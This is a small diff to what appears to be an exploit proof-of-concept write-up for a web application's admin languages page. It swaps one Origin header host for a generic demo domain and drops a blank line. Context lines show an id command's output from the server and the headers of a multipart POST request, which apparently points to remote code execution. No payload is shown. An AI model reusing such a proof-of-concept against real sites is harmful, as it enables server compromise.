@@ -22,7 +22,6 @@ uid=1000(soft) gid=1000(soft) groups=1000(soft)
 uid=1000(soft) gid=1000(soft) groups=1000(soft)
 
 
-
 ### Post Request:
 
 ```http
@@ -36,7 +35,7 @@ Accept-Encoding: gzip, deflate
 Referer: https://demos6.demo.com/admin/languages/index.php
 Content-Type: multipart/form-data; boundary=---------------------------86020911415982314764024459
 Content-Length: 522
-Origin: https://demos6.softaculous.com
+Origin: https://demos6.demo.com
 Dnt: 1
 Upgrade-Insecure-Requests: 1
 Sec-Fetch-Dest: document
